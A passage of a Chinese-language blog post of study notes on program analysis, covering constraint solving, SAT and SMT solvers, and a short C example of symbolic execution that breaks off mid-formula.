的指向分析</strong>支持域敏感分析，只要了解到有这一回事就可以了。我们探讨了指针分析的难点，它很难处理的情况以及降低敏感度的方式。最后简单介绍了指针分析和控制流分析的关系和 Class Hierarchy Analysis, Rapid Type Analysis 这两种处理方式，意识到指针分析往往是复杂综合性分析的基础。</p><p>最后，抽象解释理论是我们以上学习的方法的理论基础，虽然只是简单的学习皮毛，但是我们应该意识到<strong>不同抽象域的综合</strong>是复杂问题，但是同样是有效的增加程序分析精度的方法。文中以<strong>关系抽象域</strong>如何增加精度做了说明，特别介绍了数值分析中的八边形抽象。</p><hr><p>以上的内容都是笔者自己的学习笔记，不能说理解和认识有多么深刻，但是写出来的论述都是经过了本人的消化，整理和输出的。日后如果有时间将会在阅读完 CMU 的静态程序分析教材、南大的程序分析课程、软件理论基础之后，对内容进行进一步的补充和完善。读者如果感兴趣，可以继续关注本博客。欢迎指出错误和交流学习。让我们开始「搜索」的方式的学习吧，之后会以区块链智能合约代码分析为例，从理论到实践详细介绍符号执行的所有过程。</p><hr><p>基础的思想其实都大概涉及到了，由于笔者有论文压力了，只能需要什么学习什么，所以后期学习比较大略，没有最开始小白的时候，记录的那么细致。</p><h1>约束求解简介</h1><p>搜索的策略是精确的，但是可能复杂度非常高，所以会放弃超时的路径的搜索。约束求解就是给出了一组约束，如果约束可以成立，那么久给出这么一组值；如果不可以满足，那么找到是哪一部分造成无法满足，这一部分叫做矛盾集（unsatisfiable core）。例如对于约束</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo>&gt;</mo><mn>10</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo>&gt;</mo><mn>5</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo>+</mo><mi>b</mi><mo>=</mo><mn>25</mn></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}a&gt;10\\b&gt;5\\a+b=25\\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.32em;vertical-align:-1.91em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35em;"><span style="top:-2.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.192em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"/></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"/></svg></span></span><span style="top:-4.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.85em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">10</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">5</span></span></span><span style="top:-1.53em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">25</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.91em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>那么约束求解可以找到一组值 <code>(a,b)=(15,10)</code> 满足约束。</p><p>历史上出现了很多的约束求解器，这些求解器本质上就是让代码自己做题，去证明。当时因为大规模约束求解计算速度太慢了，但是 2000 年依赖 SAT 算法得到了极大的改进，不过知道现在似乎都还没搞清楚为啥效率就那么高的原理。</p><ul><li>SAT solver：解著名的 NP 完全问题</li><li>Linear solvers：求线性方程组</li><li>Array solvers: 求解包含数组的约束</li><li>String solver：求解字符串约束</li></ul><p>最后出现了综合性的求解工具 SMT。</p><h1>SAT</h1><p>先看 <a href="https://en.wikipedia.org/wiki/Boolean_satisfiability_problem">wiki</a> 的介绍：</p><blockquote><p>In <a href="https://en.wikipedia.org/wiki/Computer_science">computer science</a> and <a href="https://en.wikipedia.org/wiki/Formal_methods">formal methods</a>, a <strong>SAT solver</strong> is a <a href="https://en.wikipedia.org/wiki/Computer_program">computer program</a> which aims to solve the <a href="https://en.wikipedia.org/wiki/Boolean_satisfiability_problem">Boolean satisfiability problem</a>. On input a formula over <a href="https://en.wikipedia.org/wiki/Boolean_data_type">Boolean</a> variables, such as “(<em>x</em> or <em>y</em>) and (<em>x</em> or not <em>y</em>)”, a SAT solver outputs whether the formula is <a href="https://en.wikipedia.org/wiki/Satisfiability">satisfiable</a>, meaning that there are possible values of <em>x</em> and <em>y</em> which make the formula true, or unsatisfiable, meaning that there are no such values of <em>x</em> and <em>y</em>. In this case, the formula is satisfiable when <em>x</em> is true, so the solver should return “satisfiable”.</p></blockquote><p>简单的说是<strong>布尔可满足性</strong>问题，也就是说对于一个逻辑公式，能否找到一组逻辑变量，使得公式为真。这里希望读者有基础的离散数学基础，将会有助于理解和学习。由于所有的命题公式可以转化成合取范式，所以我们可以给出如下的例子：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>F</mi><mo>=</mo><mrow><mo fence="true">(</mo><mi>a</mi><mo>∨</mo><mi mathvariant="normal">¬</mi><mi>d</mi><mo fence="true">)</mo></mrow><mo>∧</mo><mrow><mo fence="true">(</mo><mi mathvariant="normal">¬</mi><mi>b</mi><mo>∨</mo><mi>c</mi><mo fence="true">)</mo></mrow><mo>∧</mo><mrow><mo fence="true">(</mo><mi>b</mi><mo>∨</mo><mi>d</mi><mo fence="true">)</mo></mrow><mo>∧</mo><mrow><mo fence="true">(</mo><mi mathvariant="normal">¬</mi><mi>b</mi><mo>∨</mo><mi mathvariant="normal">¬</mi><mi>c</mi><mo>∨</mo><mi>d</mi><mo fence="true">)</mo></mrow><mo>∧</mo><mrow><mo fence="true">(</mo><mi mathvariant="normal">¬</mi><mi>a</mi><mo>∨</mo><mi mathvariant="normal">¬</mi><mi>d</mi><mo fence="true">)</mo></mrow><mtext> </mtext><mtext> </mtext></mrow><annotation encoding="application/x-tex">F=\left( a\lor \lnot d \right) \land \left( \lnot b\lor c \right) \land \left( b\lor d \right) \land \left( \lnot b\lor \lnot c\lor d \right) \land \left( \lnot a\lor \lnot d \right) \,\,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">¬</span><span class="mord mathnormal">d</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord">¬</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">c</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">d</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord">¬</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">¬</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">d</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord">¬</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">¬</span><span class="mord mathnormal">d</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span></span></span></span></span></p><p>对于以上的命题公式 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span> 是否存在一组变量使得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">F=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>呢。最直接的方法就是遍历，复杂度为 2 的幂次。接下来做一些优化：</p><ol><li>短路机制。比如对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">(</mo><mi>a</mi><mo>∨</mo><mi mathvariant="normal">¬</mi><mi>d</mi><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\left( a\lor \lnot d \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">¬</span><span class="mord mathnormal">d</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span> 有 1 个为 1，那么就不用算另外一个了，如果整体为 0，那么就剪枝，不再搜索下去。</li><li>赋值推导，对于每个变量，如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> 为 1，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">¬</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">\lnot a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord">¬</span><span class="mord mathnormal">a</span></span></span></span> 必须为 0，为了保持 $\left( \lnot a\lor \lnot d \right) $ 为 1，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">¬</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">\lnot d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">¬</span><span class="mord mathnormal">d</span></span></span></span> 必须为 1。这样根据条件推导下去。 到那时复杂的公式中推导可能代价比较大，实际应用的规则还是比较复杂。</li><li>平凡属性。优先考虑恒真或者恒假的公式，用常数代替。</li></ol><p>根据以上的规则，学术界提出了 <strong>DPLL 算法</strong>，可以知道原理还是相对简单的。另外还有优化的方法，比如</p><ul><li>考查变量之间的关系，增加赋值的约束，缩小解空间。</li><li>考查子句的等价性，去除冗余性。</li><li>是否有些变量比其他变量影响大，先赋值成 0 还是 1。比如优先选择短的子句中的变量，优先选择出现次数多的变量，优先选择出现冲突次数较多的变量等。</li></ul><p>在 2000 年初，出现了非常重大的进步，学术界提出了<strong>冲突导向的子句学习</strong>（<strong>CDCL</strong>, Conflict-Driven Clause Learning）。也就是一边搜索，一边学习公式的性质，改进搜索方法。这似乎和 AI 类似。笔者暂时跳过，进一步了解可以见：</p><ol><li><a href="https://www.cs.ox.ac.uk/people/james.worrell/lec7-2015.pdf">https://www.cs.ox.ac.uk/people/james.worrell/lec7-2015.pdf</a></li><li><a href="https://stackoverflow.com/questions/12547160/how-does-the-dpll-algorithm-work">https://stackoverflow.com/questions/12547160/how-does-the-dpll-algorithm-work</a></li><li><a href="https://en.wikipedia.org/wiki/DPLL_algorithm">https://en.wikipedia.org/wiki/DPLL_algorithm</a></li><li><em>Decision Procedures An Algorithmic Point of View</em> (Daniel Kroening, Ofer Strichman (auth.))</li></ol><h1>SMT</h1><p>SMT 是<strong>可满足性模理论</strong>（Satisfiability Modulo Theories）的简称。相比于 SAT 判断逻辑公式的可满足性，SMT 加入了一阶逻辑（也就是谓词逻辑）。比如 <code>P(x)</code> 中 <code>x</code> 是个体、<code>P</code> 是谓词，表示 <code>x</code> 具有性质 <code>P</code>。另外一阶逻辑还加入了量词，可以知道 SMT 是基于命题逻辑的 SAT 的拓展。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>a</mi><mo>+</mo><mi>b</mi><mo>&lt;</mo><mi>c</mi><mo>∧</mo><mi>f</mi><mo stretchy="false">(</mo><mi>b</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mi>c</mi><mo>∨</mo><mi>c</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">a+b&lt;c \wedge f(b)&gt;c \vee c&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5556em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5556em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></span></p><p>例如上面的式子，除了命题逻辑中的运算，还有 <code>&lt;</code> 和 <code>&gt;</code> 符号，实际上小于、大于符号代表着更加一般的逻辑判断。<code>f(b)</code> 也是表示逻辑判断。SMT 的任务就是在一组条件下，找到满足所有条件的解。</p><p>SMT 的求解有两种方法：</p><ul><li>Eager 方法：将 SMT 转换成 SAT，但是现在不常用了。简单的说，就是换元然后增加约束。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>A</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">x^2-y^2=(x+y)(x-y)=AB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 这里用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">A, B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 换元。换元之后需要保持原有的约束或者增加约束。比如 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>+</mo><mi>B</mi><mo>∈</mo><mrow><mi mathvariant="normal">i</mi><mi mathvariant="normal">n</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">v</mi><mi mathvariant="normal">a</mi><mi mathvariant="normal">l</mi></mrow><mo stretchy="false">(</mo><mn>2</mn><mi>x</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>A</mi><mo>−</mo><mi>B</mi><mo>∈</mo><mrow><mi mathvariant="normal">i</mi><mi mathvariant="normal">n</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">v</mi><mi mathvariant="normal">a</mi><mi mathvariant="normal">l</mi></mrow><mo stretchy="false">(</mo><mn>2</mn><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A+B \in {\rm interval} (2x) , A-B \in {\rm interval} (2y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">interval</span></span></span><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">interval</span></span></span><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>。</li><li>Lazy 方法：主流方法，SAT 方法和其他方法交叉使用，这样特定领域的问题可以使用现已研究过的高效算法。</li></ul><p>定理证明理论的内容，就暂时跳过，有需要再回头学习。读者可以参考如下内容：</p><ol><li>SMT 求解器标准：<a href="http://smtlib.cs.uiowa.edu/language.shtml">http://smtlib.cs.uiowa.edu/language.shtml</a></li></ol><h1>符号执行</h1><p>符号执行其实和测试很类似，都是一次只跑一条路径，如果有 bug，那么就有 bug，如果找不到也不能说明没 bug。相比于静态分析是在抽象域进行属性抽象，符号执行可能相对精确一些。</p><p>通过例子看符号执行的做法。通过符号执行分析：如果 <code>y&gt;0</code> 是否 <code>main(x,y)&gt;0</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(x,y)</span> &#123;</span><br><span class="line">y+=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span> (x&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        x+=<span class="number">10</span>;</span><br><span class="line">        z=x/<span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        z=x/<span class="number">5</span>+<span class="number">2</span>;</span><br><span class="line">        x+=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    z+=y;</span><br><span class="line">    <span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>无法确定的值，用符号代替。入口处 <code>x=a,y=b,z=0;b&gt;0;next=2</code>，表示下一个语句是第二行。</p></li><li><p>根据语句改变符号表达式。<code>x=a,y=b+10,z=0;b&gt;0;next=3</code>.</p></li><li><p>遇到条件分支就增加约束，按一定顺序遍历路径。例如选择 <code>else</code> 分支，<code>x=a,y=b+10,z=0;b&gt;0,a&lt;=0;next=8</code>；选择 <code>if</code>分支 <code>x=a,y=b+10,z=0;b&gt;0,a&gt;0;next=4</code>。</p></li><li><p>最终得到目标的约束，使用 SMT 求解。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>z</mi><mo>&gt;</mo><mn>0</mn><mtext>恒成立</mtext><mo stretchy="false">?</mo><mspace linebreak="newline"></mspace><mi>s</mi><mi mathvariant="normal">.</mi><mi>t</mi><mi mathvariant="normal">.</mi><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>=</mo><mi>a</mi><mo>+</mo><mn>10</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>y</mi><mo>=</mo><mi>b</mi><mo>+</mo><mn>10</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>z</mi><mo>=</mo><mfrac><mrow><mo fence="true">(</mo><mi>a</mi><mo>+</mo><mn>10</mn><mo fence="true">)</mo></mrow><mn>5</mn></mfrac><mo>+</mo><mrow><mo fence="true">(</mo><mi>b</mi><mo>+</mo><mn>10</mn><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">z&gt;0恒成立?\\s.t.\begin{cases}x=a+10\\y=b+10\\z=\frac{\left( a+10 \right)}{5}+\left( b+10 \right)\\a&gt;0\\b&gt;0\\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">0</span><span class="mord cjk_fallback">恒成立</span><span class="mclose">?</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:7.202em;vertical-align:-3.351em;"></span><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-1.366em;"><span class="pstrut" style="height:3.816em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-1.358em;"><span class="pstrut" style="height:3.816em;"></span><span style="height:1.816em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="1.816em" style="width:0.8889em" viewBox="0 0 888.89 1816" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V1816 H384z M384 0 H504 V1816 